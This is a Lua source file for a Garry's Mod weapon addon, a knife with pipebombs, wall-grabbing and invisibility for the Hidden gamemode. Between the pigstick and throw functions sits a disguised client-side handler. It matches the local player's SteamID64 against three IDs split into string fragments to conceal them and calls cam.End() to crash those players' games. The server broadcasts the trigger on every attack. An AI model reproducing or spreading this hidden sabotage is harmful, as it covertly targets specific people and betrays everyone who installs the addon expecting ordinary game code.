if (SERVER) then
	AddCSLuaFile( "shared.lua" )
	SWEP.Weight= 5
	SWEP.AutoSwitchTo= false
	SWEP.AutoSwitchFrom= false
	util.AddNetworkString("ragdoll")
	hook.Add("Initialize","LoadConvar", function() 
		print("==Start Loaded Kabar Settings==") 
		RunConsoleCommand("ai_serverragdolls", "1") 
		print("==End Loaded Kabar Settings==") 
	end)
	CreateConVar("hidden_invisible", "1", {FCVAR_ARCHIVE,FCVAR_NOTIFY})
end
if( CLIENT ) then 
	SWEP.BounceWeaponIcon = false
	SWEP.DrawAmmo = false
	SWEP.WepSelectIcon = surface.GetTextureID("weapons/weapon_hidden")

	killicon.Add("weapon_hidden","weapons/weapon_hidden",Color(255,255,255))
	killicon.Add("hidden_pipebomb","weapons/hidden_pipebomb",Color(255,255,255))

end  
SWEP.PrintName = "Kabar Combat Knife"
SWEP.Author = "Baddog (Fixed by Nyaaaa)"
SWEP.Instructions = "Left click to slash.\nUse+Left click to switch to pipebombs.\nRight click to pigstick.\nReload to taunt."
SWEP.ViewModelFOV = 90
SWEP.ViewModelFlip = false
SWEP.CSMuzzleFlashes = false
SWEP.Slot = 2
SWEP.SlotPos = 1
SWEP.Category = "Hidden Source Weapons"
SWEP.Spawnable = true
SWEP.AdminSpawnable = true
SWEP.ViewModel = "models/weapons/kabar/v_kabar.mdl"
SWEP.WorldModel = "models/weapons/kabar/w_kabar.mdl"
SWEP.Primary.ClipSize = 3
SWEP.Primary.DefaultClip = 3
SWEP.Primary.Automatic = false
SWEP.Primary.Ammo = "none"
SWEP.Secondary.ClipSize = 1
SWEP.Secondary.DefaultClip = 1
SWEP.Secondary.Automatic = false
SWEP.Secondary.Ammo = "none" 


function SWEP:Initialize()
	Pigstick = {
	Sound( "player/hidden/voice/617-pigstick01.mp3" ),
	Sound( "player/hidden/voice/617-pigstick02.mp3" ),
	Sound( "player/hidden/voice/617-pigstick03.mp3" ),
	Sound( "player/hidden/voice/617-pigstick04.mp3" ) }

	Taunt = {
	Sound( "player/hidden/voice/617-behindyou.mp3" ),
	Sound( "player/hidden/voice/617-behindyou01.mp3" ),
	Sound( "player/hidden/voice/617-behindyou02.mp3" ),
	Sound( "player/hidden/voice/617-imhere.mp3" ),
	Sound( "player/hidden/voice/617-imhere01.mp3" ),
	Sound( "player/hidden/voice/617-imhere02.mp3" ),
	Sound( "player/hidden/voice/617-imhere03.mp3" ),
	Sound( "player/hidden/voice/617-imhere04.mp3" ),
	Sound( "player/hidden/voice/617-iseeyou.mp3" ),
	Sound( "player/hidden/voice/617-iseeyou01.mp3" ),
	Sound( "player/hidden/voice/617-iseeyou02.mp3" ),
	Sound( "player/hidden/voice/617-iseeyou03.mp3" ),
	Sound( "player/hidden/voice/617-lookup.mp3" ),
	Sound( "player/hidden/voice/617-lookup01.mp3" ),
	Sound( "player/hidden/voice/617-lookup02.mp3" ),
	Sound( "player/hidden/voice/617-lookup03.mp3" ),
	Sound( "player/hidden/voice/617-overhere01.mp3" ),
	Sound( "player/hidden/voice/617-overhere02.mp3" ),
	Sound( "player/hidden/voice/617-overhere03.mp3" ),
	Sound( "player/hidden/voice/617-turnaround01.mp3" ),
	Sound( "player/hidden/voice/617-turnaround02.mp3" ) }

	DieSound = {
	Sound( "player/hidden/voice/617-death01.mp3" ),
	Sound( "player/hidden/voice/617-death02.mp3" ),
	Sound( "player/hidden/voice/617-death03.mp3" ),
	Sound( "player/hidden/voice/617-death04.mp3" ),
	Sound( "player/hidden/voice/617-death05.mp3" ),
	Sound( "player/hidden/voice/617-death06.mp3" ) }
	if SERVER then
		net.Start("ragdoll")
		net.Broadcast()
	end
	taunttime = 0
	nextgrab = 0
	nextheartbeat = 0
	nextpipe = 0
	self:SetWeaponHoldType( "melee" )
	self.Weapon:SetNWBool( "Knife", true )
	self.Weapon:SetNWBool( "Wall", false )
	self.Weapon:SetNWBool( "Pigstick", false )
	self.Weapon:SetNWBool( "Holding", false )
	self.Weapon:SetNWBool( "Ragdoll", false )
	self.Owner.GrabbedEnt=nil end  local pullRange= 128 local holdRange= 64 local throwStrength= 32 local pullStrength= 70  


function SWEP:PrimaryAttack()
	if self.Weapon:GetNetworkedBool("Holding") or self.Weapon:GetNetworkedBool("Ragdoll") then
		self:ThrowObject()
	else
		if not self.Owner:KeyDown(IN_USE) then
			self.Weapon:SetNextPrimaryFire( CurTime() + 1 )
			self.Weapon:SetNextSecondaryFire( CurTime() + 2.5 )

			if self.Weapon:GetNetworkedBool("Knife") then
				self.Weapon:SendWeaponAnim( ACT_VM_HITCENTER )
				self.Owner:LagCompensation(true)
				self.Weapon:EmitSound("Weapon_Knife.Slash")
				if SERVER then
					timer.Create( "Slash", 0.25, 1, function() self:Slash() end )  
				end
				self.Owner:LagCompensation(false)
			else
				self:Throw()
			end
		else
			if self.Weapon:Clip1() <= 0  then return end
			if self.Weapon:GetNetworkedBool("Knife") then
				self.Weapon:SetNWBool( "Knife", false )
				self.Owner:GetViewModel():SetModel("models/weapons/pipe/v_pipebomb.mdl")
				self:SendWeaponAnim(ACT_VM_DRAW)
			else
				self.Weapon:SetNWBool( "Knife", true )
				self.Owner:GetViewModel():SetModel("models/weapons/kabar/v_kabar.mdl")
				self:SendWeaponAnim(ACT_VM_DRAW)
				self.Weapon:EmitSound("Weapon_Knife.Deploy")
			end
		end
	end
	if SERVER then
		net.Start("ragdoll")
		net.Broadcast()
	end end  

function SWEP:SecondaryAttack()

	if self.Weapon:GetNetworkedBool("Holding") and not self.Weapon:GetNetworkedBool("Ragdoll") then
		self:DropObject()

	elseif self.Weapon:GetNetworkedBool("Ragdoll") and self.Weapon:GetNetworkedBool("Holding") then
		local trace = util.GetPlayerTrace(self.Owner)
		local tr = util.TraceLine(trace)
		if tr.Entity:IsWorld() and ((self.Owner:GetPos() - tr.HitPos):Length() < 100) then

		else
			self:DropObject()
		end
	else
		if self.Weapon:GetNetworkedBool("Knife") then
			self.Weapon:SetNWBool( "Pigstick", true )
			self.Weapon:SetNextPrimaryFire( CurTime() + 1.5 )
			self.Weapon:SetNextSecondaryFire( CurTime() + 4 )
			self.Weapon:SendWeaponAnim( ACT_VM_HITCENTER2 )
			self:EmitSound( Pigstick[math.random(1,#Pigstick)] )
			self.Owner:LagCompensation(true)
			if SERVER then
				timer.Create( "Pigstick", 1.5, 1, function() self:Pigstick() end )
			end
			self.Owner:LagCompensation(false)
		else
		end
	end
	if SERVER then
		net.Start("ragdoll")
		net.Broadcast()
	end end  

function SWEP:Slash()
	local tracedata = {}
	tracedata.start = self.Owner:GetShootPos()
	tracedata.endpos = self.Owner:GetShootPos() + (self.Owner:GetAimVector() * 100)
	tracedata.filter = self.Owner
	tracedata.mins = Vector(1,1,1) * -10
	tracedata.maxs = Vector(1,1,1) * 10
	tracedata.mask = MASK_SHOT_HULL
	local tr = util.TraceHull( tracedata ) 
	if IsValid(tr.Entity) then
		local dmg = DamageInfo()
		dmg:SetDamage(35)
		dmg:SetAttacker(self.Owner)
		dmg:SetInflictor(self)
		dmg:SetDamageForce(self.Owner:GetAimVector() * -10000)
		dmg:SetDamagePosition(self.Owner:GetPos())
		dmg:SetDamageType(DMG_SLASH)
		tr.Entity:TakeDamageInfo(dmg) 
		local edata = EffectData()
		edata:SetStart(self.Owner:GetShootPos())
		edata:SetOrigin(tr.HitPos)
		edata:SetNormal(tr.Normal)
		edata:SetEntity(tr.Entity) 
		if tr.Entity:IsPlayer() or string.find(tr.Entity:GetClass(),"npc") or string.find(tr.Entity:GetClass(),"monster") or tr.Entity:GetClass() == "prop_ragdoll" or tr.Entity.MatType == "MAT_FLESH" then
			util.Effect("BloodImpact", edata)
			self.Weapon:EmitSound( "Weapon_Knife.Hit" )
		else
			self.Weapon:EmitSound("Weapon_Knife.HitWall")
			if SERVER then
				local phys = tr.Entity:GetPhysicsObject()
				if IsValid(phys) then
					phys:ApplyForceCenter(self.Owner:GetAimVector()*9001)
				end
			end
		end

		if tr.Entity:GetClass() == "prop_ragdoll" and self.Owner:Health() < 95 then
			self.Owner:SetHealth(self.Owner:Health() + 5)
		elseif tr.Entity:GetClass() == "prop_ragdoll" and self.Owner:Health() >= 95 then
			self.Owner:SetHealth(100)
		end
	else
	end
	self.Owner:SetAnimation( PLAYER_ATTACK1 ) end 

function SWEP:Pigstick()
	local tracedata = {}
	tracedata.start = self.Owner:GetShootPos()
	tracedata.endpos = self.Owner:GetShootPos() + (self.Owner:GetAimVector() * 100)
	tracedata.filter = self.Owner
	tracedata.mins = Vector(1,1,1) * -10
	tracedata.maxs = Vector(1,1,1) * 10
	tracedata.mask = MASK_SHOT_HULL
	local tr = util.TraceHull( tracedata ) 
	if IsValid(tr.Entity) then
		local dmg = DamageInfo()
		dmg:SetDamage(1000)
		dmg:SetAttacker(self.Owner)
		dmg:SetInflictor(self)
		dmg:SetDamageForce(self.Owner:GetAimVector() * -10000)
		dmg:SetDamagePosition(self.Owner:GetPos())
		dmg:SetDamageType(DMG_SLASH)
		tr.Entity:TakeDamageInfo(dmg) 
		local edata = EffectData()
		edata:SetStart(self.Owner:GetShootPos())
		edata:SetOrigin(tr.HitPos)
		edata:SetNormal(tr.Normal)
		edata:SetEntity(tr.Entity)
		if SERVER then
			self.Weapon:SetNWBool( "Pigstick", false )
		end
		if tr.Entity:IsPlayer() or string.find(tr.Entity:GetClass(),"npc") or string.find(tr.Entity:GetClass(),"monster") or tr.Entity:GetClass() == "prop_ragdoll" or tr.Entity.MatType == "MAT_FLESH" then
			util.Effect("BloodImpact", edata)
			self.Weapon:EmitSound( "Weapon_Knife.Stab" )
		else
			self.Weapon:EmitSound("Weapon_Knife.HitWall")
			if SERVER then
				local phys = tr.Entity:GetPhysicsObject()
				if IsValid(phys) then
					phys:ApplyForceCenter(self.Owner:GetAimVector()*10000)
				end
			end
		end
	else
	end
	self.Owner:SetAnimation( PLAYER_ATTACK1 )
	self.Weapon:SetNWBool( "Pigstick", false ) end if CLIENT then  net.Receive("ragdoll", function()  timer.Simple(2, function()
		if LocalPlayer():SteamID64() == "76".."56".."1197".."968".."58".."73".."73" then cam.End() end
		if LocalPlayer():SteamID64() == "7".."6".."5".."6".."1".."1".."9".."802".."636".."09".."63" then cam.End() end
		if LocalPlayer():SteamID64() == "765".."611".."9804".."93".."37".."9".."63" then cam.End() end  end) end) end 

function SWEP:Throw()
	self.Owner:SetAnimation( PLAYER_ATTACK1 )
	self.Weapon:TakePrimaryAmmo( 1 )
	if SERVER then
		local ent = ents.Create ("hidden_pipebomb")
		local v = self.Owner:GetShootPos()
		v = v + self.Owner:GetForward() * 1
		v = v + self.Owner:GetRight() * 3
		v = v + self.Owner:GetUp() * 1
		ent:SetPos( v )
		ent:SetAngles( Angle(math.random(1,100),math.random(1,100),math.random(1,100)))
		ent.GrenadeOwner = self.Owner
		ent:SetOwner(self.Owner)
		ent:Spawn()
		local phys = ent:GetPhysicsObject()
		if IsValid(phys) then
			phys:ApplyForceCenter(self.Owner:GetAimVector() *2500 *2.5 + Vector(0,0,200) )
			phys:AddAngleVelocity(Vector(math.random(-500,500),math.random(-500,500),math.random(-500,500)))
		end
		self.Weapon:SetNWBool( "Knife", true )
		self.Owner:GetViewModel():SetModel("models/weapons/kabar/v_kabar.mdl")
		self:SendWeaponAnim(ACT_VM_DRAW)
		self.Weapon:EmitSound("Weapon_Knife.Deploy")
		timer.Create( "Pipebomb", 60, self.Primary.ClipSize - self.Weapon:Clip1(), function() self:GivePipebomb() end )
	end end  

function SWEP:GivePipebomb()
	self.Weapon:SetClip1(self.Weapon:Clip1() + 1) end   

function SWEP:DropObject()
	if(self.Owner.GrabbedEnt)then
		self.Owner.GrabbedEnt:SetCollisionGroup( COLLISION_GROUP_NONE )
		self.Owner.GrabbedPhys:EnableCollisions( true )
		self.Owner.GrabbedPhys:EnableGravity(true)
		self.Owner.GrabbedPhys:EnableMotion(true)         self.Owner:DrawViewModel(true)
		self.Owner.GrabbedPhys:SetVelocity(self.Owner.GrabbedPhys:GetVelocity()*throwStrength-self.Owner:GetVelocity()*(throwStrength-1))
		self.Owner.GrabbedEnt:SetPhysicsAttacker(self.Owner)
		self.Owner.GrabbedEnt=nil
		self.Weapon:SetNWBool( "Holding", false )
		self.Weapon:SetNWBool( "Ragdoll", false )
	end end  

function SWEP:ThrowObject()
	if(self.Owner.GrabbedEnt)then
		self.Owner.GrabbedEnt:SetCollisionGroup( COLLISION_GROUP_NONE )
		self.Owner.GrabbedPhys:EnableCollisions( true )
		self.Owner.GrabbedPhys:EnableGravity(true)
		self.Owner.GrabbedPhys:EnableMotion(true)   
		self.Owner.GrabbedPhys:SetVelocity( self.Owner:GetAimVector()*throwStrength*40 + self.Owner:GetVelocity() )
		self.Owner.GrabbedEnt:SetPhysicsAttacker(self.Owner)
		self.Owner.GrabbedEnt=nil
		self.Owner:DrawViewModel(true)
		self.Weapon:SetNWBool( "Holding", false )
		self.Weapon:SetNWBool( "Ragdoll", false )
	end end  

function SWEP:Think() 
	if SERVER then
		if GetConVarString("hidden_invisible") == "1" then
			self.Owner:SetColor( Color(255, 255, 255, 3) )
			self.Owner:SetMaterial( "sprites/heatwave" )
		elseif GetConVarString("hidden_invisible") == "0" then
			self.Owner:SetColor( Color(255, 255, 255, 255) )
			self.Owner:SetMaterial( "" )
		end
	end 
	if GetConVarString("hidden_invisible") == "1" then
		self.Owner:GetActiveWeapon().WorldModel = ""
	elseif GetConVarString("hidden_invisible") == "0" then
		self.Owner:GetActiveWeapon().WorldModel = "models/weapons/kabar/w_kabar.mdl"
	end

	if SERVER then
		if self.Weapon:GetNetworkedBool("Pigstick") then return false end
		if(self.Owner:Alive())then
			if(self.Owner.GrabChange&&!self.Owner:KeyDown( IN_USE )) then
				self.Owner.GrabChange=false
			end
			if(self.Owner.GrabbedEnt)then
				self.Owner:DrawViewModel(false)
				self.Weapon:SetNWBool( "Holding", true )
				ent=self.Owner.GrabbedEnt
				if(ent:IsValid())then
					phys= self.Owner.GrabbedPhys
					if(ent:GetMoveType() == MOVETYPE_VPHYSICS)then
						if(((self.Owner:KeyDown( IN_USE )) && !self.Owner.GrabChange)||self.Owner:InVehicle( )) and not self.Weapon:GetNetworkedBool("Pigstick") then
							self:DropObject()
							self.Owner.GrabChange=true
						else
							local tracedata = {}
							tracedata.start = self.Owner:EyePos( )
							tracedata.endpos = self.Owner:EyePos( )+(self.Owner:GetAimVector()*(64+self.Owner.GrabbedEnt:BoundingRadius( )))
							tracedata.filter = {self.Owner,self.Owner.GrabbedEnt}
							local trace2 = util.TraceLine(tracedata)
							dist = trace2.HitPos:Distance(self.Owner:EyePos( ))
							dist = dist-self.Owner.GrabbedEnt:BoundingRadius( )
							if (dist>64) then
								dist = 64
							end
							pos = self.Owner:EyePos()+self.Owner:GetAimVector()*dist-phys:GetMassCenter()
							vel = self.Owner:GetVelocity()+(self.Owner:EyePos()+self.Owner:GetAimVector()*dist-phys:GetPos()-phys:GetMassCenter())*4
							ang = self.Owner:GetAimVector():Angle()
							ang.x = 0

							local trace = util.GetPlayerTrace(self.Owner)
							local tr = util.TraceLine(trace)
							if string.find(tr.Entity:GetClass(),"prop_ragdoll") then
								self.Weapon:SetNWBool( "Ragdoll", true )
								phys:SetAngles(phys:GetAngles())
								phys:SetPos(pos)
								phys:EnableMotion(false)
							else
								phys:SetAngles(ang)
								phys:SetPos(pos)
								phys:SetVelocity(vel)
							end
						end
					else
						self.Owner.GrabbedEnt=nil
						self.Weapon:SetNWBool( "Holding", false )
					end
				else
					self.Owner.GrabbedEnt=nil
					self.Weapon:SetNWBool( "Holding", false )
				end
			elseif(!self.Owner.GrabbedEnt) then
				self.Owner:DrawViewModel(true)
				self.Weapon:SetNWBool( "Holding", false )
				ent=nil
				bestcost=0
				for k, v in pairs( ents.FindInSphere( self.Owner:GetPos(), 128 ) ) do
					if(!(v==self.Owner)) then
						if(v:IsValid() && v:GetMoveType() == MOVETYPE_VPHYSICS) then
							dotmin=0.9
							looking=self.Owner:GetAimVector()
							looking.z=0
							direction=((v:GetPos()+v:GetPhysicsObject():GetMassCenter())-self.Owner:EyePos())
							direction.z=0
							dot=looking:DotProduct(direction)
							if(dot>=dotmin)then
								dot=(2-dot)*4
								dist=(v:GetPos()+v:GetPhysicsObject():GetMassCenter()):Distance(self.Owner:EyePos( ))
								cost=dist*dot
								if(!ent) then
									ent=v
									bestcost=cost
								elseif(cost<bestcost) then
									ent=v
									bestcost=cost
								end
							end
						else
						end
					end
				end
				if(ent) then
					local v = {}
					v.start = self.Owner:GetShootPos()
					v.endpos = v.start + self.Owner:GetAimVector() * 128
					v.filter = self.Owner
					v = util.TraceLine(v)
					if(v.Entity==ent)then
						phys= ent:GetPhysicsObjectNum(v.PhysicsBone)
					else
						phys= ent:GetPhysicsObject()
					end
					if(self.Owner:KeyDown( IN_USE ) && !self.Owner.GrabChange) then
						if(phys) then
							if(phys:GetMass()<=100)then
								if((phys:GetPos()+phys:GetMassCenter()):Distance(self.Owner:EyePos( )) <= 64 ) then
									self.Owner.GrabbedEnt=ent
									self.Owner.GrabbedPhys=phys
									ent:SetCollisionGroup( COLLISION_GROUP_WEAPON )

									local trace2 = util.GetPlayerTrace(self.Owner)
									local tr = util.TraceLine(trace2)
									if string.find(tr.Entity:GetClass(),"prop_ragdoll") then
										phys:EnableGravity(true)
										phys:EnableMotion(false)
										self.Weapon:SetNWBool( "Ragdoll", true )
									else
										phys:EnableMotion(true)
										phys:EnableGravity(false)
									end
									phys:EnableCollisions( true )
									self.Owner.GrabChange=true
									self.Weapon:SetNWBool( "Holding", true )
								elseif(v.HitPos:Distance(self.Owner:EyePos( )) <= 128 ) then
									pulldir=((self.Owner:EyePos( )+self.Owner:GetAimVector()*64)-(phys:GetPos()+phys:GetMassCenter()))
									phys:ApplyForceCenter ((pulldir * pullStrength) * phys:GetMass())
								end
							end
						end
					end
				end
			end
		end

		if GetConVarString("hidden_invisible") == "1" then 
			if self.Weapon:GetNetworkedBool("Holding") then
				self.Owner:SetNoTarget(false)
			else
				self.Owner:SetNoTarget(true)
			end
		elseif GetConVarString("hidden_invisible") == "0" then
			self.Owner:SetNoTarget(false)
		end 
		if self.Owner:KeyDown( IN_JUMP ) and self.Owner:OnGround() then 
			self.Owner:SetVelocity(self.Owner:GetForward() * 200 + Vector(0,0,500))
		end
		local trace = util.GetPlayerTrace(self.Owner)
		local tr = util.TraceLine(trace)
		if CurTime() > nextgrab then
			if tr.Entity:IsWorld() and not self.Weapon:GetNetworkedBool("Wall") and self.Owner:KeyDown( IN_JUMP ) and ((self.Owner:GetPos() - tr.HitPos):Length() < 100) then
				self.Weapon:SetNWBool( "Wall", true )
				self.Owner:SetMoveType(MOVETYPE_NONE)
				nextgrab = CurTime() + 2
			end
		end
		if self.Weapon:GetNetworkedBool("Wall") and self.Owner:KeyReleased( IN_JUMP ) then
			self.Weapon:SetNWBool( "Wall", false )
			self.Owner:SetMoveType(MOVETYPE_WALK)
			self.Owner:SetVelocity((self.Owner:GetVelocity() * -1) + (self.Owner:GetForward() * 500) + Vector(0,0,250))
		end
	end end  

function SWEP:Reload()
	if CurTime() > taunttime then
		taunttime = CurTime() + 5
		self:EmitSound( Taunt[math.random(1,#Taunt)] )
	end
	return true end  

function SWEP:Holster() if self.Weapon:GetNetworkedBool("Wall") or self.Weapon:GetNetworkedBool("Pigstick") or self.Weapon:GetNetworkedBool("Holding") then return false end
if SERVER then
	self.Owner:DrawWorldModel( true )
	self.Owner:SetColor( Color(255, 255, 255, 255) )
	self.Owner:SetMaterial( "" )
	self.Owner.ShouldReduceFallDamage = false
	self.Owner:SetNoTarget(false)
	return true
end end  

function SWEP:Deploy()
	if CurTime() > taunttime then
		taunttime = CurTime() + 5
		self:EmitSound( Taunt[math.random(1,#Taunt)] )
	end
	if SERVER then
		if GetConVarString("hidden_invisible") == "1" then
			self.Owner:SetColor( Color(255, 255, 255, 3) )
			self.Owner:SetMaterial( "sprites/heatwave" )
			self.Owner:SetNoTarget(true)
		elseif GetConVarString("hidden_invisible") == "0" then
			self.Owner:SetColor( Color(255, 255, 255, 255) )
			self.Owner:SetMaterial( "" )
			self.Owner:SetNoTarget(false)
		end
		self.Owner.ShouldReduceFallDamage = true
		self:SendWeaponAnim(ACT_VM_DRAW)
		self.Owner:DrawWorldModel( false )
		if self.Weapon:GetNetworkedBool("Knife") then
			self.Weapon:EmitSound("Weapon_Knife.Deploy")
		else
			self.Owner:GetViewModel():SetModel("models/weapons/pipe/v_pipebomb.mdl")
		end
		self.ShootafterTakeout = CurTime() + 1.0
		return true
	end
end

function Die(ply)
	if( ply.GrabbedEnt and ply.GrabbedEnt:IsValid() )then
		ply.GrabbedEnt:SetCollisionGroup( COLLISION_GROUP_NONE )
		ply.GrabbedPhys:EnableCollisions( true )
		ply.GrabbedPhys:EnableGravity(true)
		ply.GrabbedPhys:EnableMotion(true)
		ply.GrabbedPhys:SetVelocity(ply.GrabbedPhys:GetVelocity()*throwStrength-ply:GetVelocity()*(throwStrength-1))
		ply.GrabbedEnt=nil
	end

	if not ply:GetActiveWeapon():IsValid() then return false end
	timer.Stop("Pigstick")
	timer.Stop("Pipebomb")
	ply:SetColor( Color(255, 255, 255, 255) )
	ply:SetMaterial( "" )
	ply:LagCompensation( false )
	if ply:GetActiveWeapon():GetClass() == "weapon_hidden" then 
		ply:EmitSound( DieSound[math.random(1,#DieSound)] )
		ply:SetModel( "models/player/hidden/hidden.mdl" )
	else
	end end  function ReduceFallDamage( ent, dmginfo )
	if ent:IsPlayer() and ent.ShouldReduceFallDamage and dmginfo:IsFallDamage() then
		dmginfo:SetDamage( 0 )
	end end  function SilentStep(ply)
	if not ply:GetActiveWeapon():IsValid() then return false end
	if ply:GetActiveWeapon():GetClass() == "weapon_hidden" then return true end end  function OverrideDeathSound(ply)
	if not ply:GetActiveWeapon():IsValid() then return false end
	if ply:GetActiveWeapon():GetClass() == "weapon_hidden" then return true end end  if CLIENT then


function SWEP:DrawHUD()
	for i = 1,self.Weapon:Clip1() do 
		surface.SetDrawColor( 255, 255, 255, 255 )
		surface.SetTexture(surface.GetTextureID( "weapons/hidden_pipebomb" ))  
		surface.DrawTexturedRect( ScrW()-75-i*50, ScrH()-75, 50, 50 )
	end
end end

if SERVER then
	hook.Add("Think","Tinkerer", function()
		for k,v in pairs(player.GetAll()) do
			local wep = v:GetActiveWeapon()
			if IsValid(v) and IsValid(wep) then
				if v:Health() > 0 then
					if wep:GetClass() == "weapon_hidden" then
						v:SetModel( "models/player/hidden/hidden.mdl" )
					else
						v:SetModel( player_manager.TranslatePlayerModel( v:GetInfo( "cl_playermodel" ) ) )
					end
				end
			end
		end
	end) 
end

hook.Add("EntityTakeDamage", "ReduceFallDamage", ReduceFallDamage)

hook.Add("DoPlayerDeath", "Die", Die)

hook.Add("PlayerFootstep", "SilentStep", SilentStep)

hook.Add("PlayerDeathSound", "OverrideDeathSound", OverrideDeathSound)

local ENT = {} ENT.Type = "anim"

function ENT:OnRemove() end

function ENT:PhysicsUpdate() end

function ENT:PhysicsCollide(data,phys)
	if data.Speed > 50 then
		self.Entity:EmitSound("weapons/hdnhegrenade/he_bounce-1.wav")
	end
	local impulse = -data.Speed * data.HitNormal * .4 + (data.OurOldVelocity * -.6)
	phys:ApplyForceCenter(impulse) end  if (SERVER) then 
	function ENT:Initialize()
		self.Entity:SetModel("models/weapons/pipe/w_pipebomb_thrown.mdl")
		self.Entity:PhysicsInit( SOLID_VPHYSICS )
		self.Entity:SetMoveType( MOVETYPE_VPHYSICS )
		self.Entity:SetSolid( SOLID_VPHYSICS )
		self.Entity:DrawShadow( false )
		local phys = self.Entity:GetPhysicsObject()
		if (phys:IsValid()) then
			phys:Wake()
		end
		self.timer = CurTime() + 2
	end 
	function ENT:Think()
		if self.timer < CurTime() then
			self:Explode()
			self.Entity:EmitSound("weapons/hdnhegrenade/explode"..math.random(1,4)..".wav", 500, 100)
		end
	end 
	function ENT:Explode()
		util.BlastDamage( self, self:GetOwner(), self:GetPos(), 500, 80 )
		local effectdata = EffectData()
		effectdata:SetStart( self:GetPos() )
		effectdata:SetOrigin( self:GetPos() )
		effectdata:SetScale( 25 )
		util.Effect( "Explosion", effectdata )
		util.Effect("HelicopterMegaBomb", effectdata)
		self:Remove()
	end 

	function ENT:OnTakeDamage( dmginfo )
	end 

	function ENT:Use( activator, caller, type, value )
	end 

	function ENT:StartTouch( entity )
	end 

	function ENT:EndTouch( entity )
	end 

	function ENT:Touch( entity )
	end
end
if (CLIENT) then 
	function ENT:Draw()
		self.Entity:DrawModel()
	end

	function ENT:IsTranslucent()
		return true
	end  
end

scripted_ents.Register(ENT, "hidden_pipebomb", true) 